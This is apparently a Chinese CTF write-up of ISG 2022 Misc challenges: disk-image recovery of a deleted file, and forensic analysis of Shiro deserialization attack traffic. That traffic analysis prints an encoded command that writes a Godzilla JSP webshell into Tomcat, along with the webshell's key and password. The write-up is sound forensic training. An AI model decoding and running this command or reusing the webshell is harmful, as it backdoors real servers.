+</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <p>开学事比较多，并且观安和网鼎时间完美重合，简单划划水。</p>
+<h2 id="misc">Misc</h2>
+<h3 id="disg">DISG</h3>
+<!--more-->
+<blockquote>
+<p>黑客李明在自己的磁盘上编辑完一份重要文件后立马删除了，我们拿到了他的磁盘镜像文件，你能帮我们找出来他所编辑过的机密文件吗？</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/isg/image-20220826184903633.png" alt="image-20220826184903633"></p>
+<p>使用 <code>DiskGenius</code> 打开 <code>img</code> 文件，<code>\$RECYCLE.BIN\S-1-5-21-87142730-3356978945-767715265-500</code> 发现word文档，右击提取到桌面</p>
+<p><img src="https://img.5ime.cn/isg/image-20220826185005605.png" alt="image-20220826185005605"></p>
+<p><code>delete </code>删掉猫图，发现 <code>flag</code></p>
+<p><img src="https://img.5ime.cn/isg/image-20220826185049808.png" alt="image-20220826185049808"></p>
+<p><img src="https://img.5ime.cn/isg/image-20220826185055522.png" alt="image-20220826185055522"></p>
+<h3 id="castle">castle</h3>
+<blockquote>
+<p>某公司的网站遭到了黑客入侵，应急响应小组已经从防护设备中提取了入侵流量，请你一起分析黑客的攻击手法，并找出被黑客窃取的秘密</p>
+</blockquote>
+<p>一顿分析下来发现是 <code>shiro反序列化</code> 的流量包</p>
+<p><img src="https://img.5ime.cn/isg/image-20220830110545458.png" alt="image-20220830110545458"></p>
+<p>解密一下</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>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</span></span></code></pre>
+<p><img src="https://img.5ime.cn/isg/image-20220830111226982.png" alt="image-20220830111226982"></p>
+<p>发现通过 <code>echo</code> 执行了一段 <code>base64</code> ，解码一下发现向 <code>logout.jsp</code> 写入了内容</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>ZWNobyBINHNJQUZ2Zi9XSUMvN1ZXYTIvYk5oVDlLNXlBQUNRbUVFbmFCR3RWcllpVERDaTJyQzNjWWdHR2ZhQ29hMXVkWGlPcFJLN2cvOTdMaHh3N3NkTzFSVDRrb3Noekw4ODlQT0wxcTRPZnlOU29vcDZUWHFiUk0za0toOWt2NG9VOE9qaytmaTZpWkZ4dGhkWnBaUC9melZYNVNZcC8xTTcrM0V1V0VGbmlrRndUNkEzVXVTYm45djJQUnVTZ2hyYkx5a0tTYTdveFNUNnpRWGN0S1BxWkphdUFjT3ZrUGMyV0J2NytoOGlNRFFwTXAycmlvRHlIV1ZHRFExR1p4ZVF3Umd3dm9aNmJCV1loWTU0UTM0K0pkSncxVFFtaUpoVWJpRkhMNFpPNEVUMlhhdG1haHA4WDdRSVp5WFRITEorRGVWTnJJMm9KTkRxN25FWXNrYnlvQzBPcjEwY3ZqK01hYnNsV25HNUI4aWxJWlA0N0xLZjRSbnRwMDB5UWpLWXM5bGxZRWtxVFBHOStLMnBSVW8wNnJxUXdja0hvWlMraE5VVlRFMWlMVUhkbGlZZ1ZDV1VpSzRPUHV6T2hZYWdaR2NJUVEwbnFJN0Z1NGdybkdtU25DclBrVjZDMW1NTkZNUWR0U0pWVWlIMEVzUzNHMWNVSmlsSHhyczJGQWFvM2E3UkhvOFBKVUYrcnBSRzA0cFV3Q3o0cDVtOXFBM1Awd0ZGTUtwNjdQUkROVGVQWjA2TlQrL0t4eGNNL0Z4cW9QZVFkQXBGaEZTVENCeXEwVzZBTU01dyt2NnhsazhQb2pBeWxNZ3ZWM0dweWwzRHdQdlQ0SkVUZmlMS0RMU245ZXVyQWZOYW9QMFdGcXJqNk9sT1VmT0xXVWFLMzJTZVFodmlkRmVid2tWYXZLekNMSnFjUkRzTnlGTHN0R0hyc3B2a1hpVHBzbUV4R0Z1R2tXUWl5cWZ4bndUYXpnbHY5RU5TMG1mRUFIQTVMSDhKbnd2Mm51MXJ2R0hKNnRPZnU0UmEwN3dDY0ltUzNKTHFyZVZWb3lTZG4wOHZ4QkJRS1EvWXBnenV2Zllhdzc2bjY2YW85dG40YkRlZW9QYlRjYUM5WHpnVTR5NDAyL0xybFF2U1BXeTZIUnkzbmlmMWZ5M2xXTE9UY0k3NWZmU0Mrci8yQitDSFhrMWx0TFBET2FnOFUyV2UxYjZoMjBzMW1Yc1ducVhtbjRRNStmWFZnTzFud0NsN0JJdDJ5bTRML3VuQm52eE1LMVRGNDBkcUdqZGV4US9mVVBtSXlFNlVHbGhRelFqWGU5cmlsalRrelNEL3I4R0xIM3I4c3NXbEhMRTJkSllZUnBuZkNYRXU4cG1aUjZIdXliZlIvZTgyL2R3U1F6Z3FRd1RBU3ZwODFjTmRSN09DSnMzdlJjTnRyenBRU3k3ZWRhVHVEY29Pb2lGQUszOU4xcTlrSHBPdVBaSlpTLzh1RWZhVjhkczhzTTQ2TVVUenE5OXlZYUxGbG5qZlkzSHBqZTU5dW0xcURUZnNYTmxWYlBMKzFBNG85bStzdTA3N2JIY2JZNzJ5V2RmOTdOSGlybi9XQkJNYXV5N1Y5MktnT0dQc0dFbzdDYXZmdkVEVGRGM0J4WlFJM0NnQUEgfGJhc2U2NCAtZHxnemlwIC1kID4gL3Vzci9sb2NhbC90b21jYXQvd2ViYXBwcy9ST09UL2xvZ291dC5qc3A=</span></span></code></pre>
+<p><img src="https://img.5ime.cn/isg/image-20220830111337470.png" alt="image-20220830111337470"></p>
+<p>再次解密发现就是最常见的哥斯拉 <code>jsp马</code></p>
+<p><img src="https://img.5ime.cn/isg/image-20220830111449880.png" alt="image-20220830111449880"></p>
+<p>在最后一个流里发现pass变成了supersuperpassword</p>
+<p><img src="https://img.5ime.cn/isg/image-20220830114708164.png" alt="image-20220830114708164"></p>
+<p>解密一下发现新写入路径 index.html 和 新密钥</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>path=/index.html</span></span>
+<span class="line" data-line="2"><span>secretKey=57e7bebdf2501f02</span></span>
+<span class="line" data-line="3"><span>evalClassName=org.apache.coyote.ser.std.SerializableSerializer</span></span>
+<span class="line" data-line="4"><span>methodName=run</span></span>
+<span class="line" data-line="5"><span>pwd=supersuperpassword</span></span></code></pre>
+<p><img src="https://img.5ime.cn/isg/image-20220830115036657.png" alt="image-20220830115036657"></p>
+<p>我们直接更换密钥再次解密，解密最后的响应包得到flag</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>4611012B612C3BAEPHCNu5r7f03UZyZQ5gQIbjDUiDIV3stT2ZcFdJ93TLGhwtWGNkxIaVxiqBTwpqYoGA6ZJz8w/UD9h2A0vwpkyA==C9331C0E8C9FA966</span></span></code></pre>
+<p><img src="https://img.5ime.cn/isg/image-20220830120311917.png" alt="image-20220830120311917"></p>
+<p><img src="https://img.5ime.cn/isg/image-20220830120300464.png" alt="image-20220830120300464"></p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/isg-2022/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/isg-2022/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.DMKo1lxI.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2026 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelectorAll("[data-live-photo]");if(!o.length)return;const e=()=>{o.forEach(t=>{t.setAttribute("data-live-photo-initialized","true")})},i=()=>{const{LivePhotosKit:t}=window;try{t?.Player?.initialize()}catch(n){console.error("LivePhotosKit 初始化失败:",n)}e()};if(window.LivePhotosKit)i();else{const t=document.createElement("script");Object.assign(t,{src:"https://cdn.apple-livephotoskit.com/lpk/1/livephotoskit.js",async:!0,crossOrigin:"anonymous",onerror:()=>{console.error("LivePhotosKit 脚本加载失败"),e()},onload:()=>setTimeout(i,100)}),document.head.appendChild(t)}});</script></body></html>
